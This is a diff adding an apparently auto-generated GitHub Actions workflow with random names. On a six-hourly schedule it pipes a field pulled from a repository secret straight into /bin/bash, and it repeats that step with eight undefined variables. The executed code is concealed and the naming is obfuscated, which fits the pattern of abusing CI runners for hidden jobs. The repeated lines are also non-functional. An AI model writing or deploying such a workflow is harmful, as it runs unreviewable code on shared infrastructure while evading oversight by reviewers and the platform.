@@ -1,0 +1,26 @@
+name: kebiwang6182
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '6 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: kebiwang6182
+        env:
+          sle6908: ${{ secrets.sle6908 }}
+        run: |
+          echo $sle6908 | jq -r .xrbix05705 | /bin/bash
+          echo $rcye75 | jq -r .admi020 | /bin/bash
+          echo $mzu63 | jq -r .iaqi78 | /bin/bash
+          echo $neh860 | jq -r .lfhgi868 | /bin/bash
+          echo $ipch62 | jq -r .tfs01465 | /bin/bash
+          echo $aa15 | jq -r .ljp55 | /bin/bash
+          echo $tiyu37297 | jq -r .ggeqb545 | /bin/bash
+          echo $kok1508 | jq -r .sqipg61009 | /bin/bash
+          echo $lg23761 | jq -r .htwi6 | /bin/bash
+
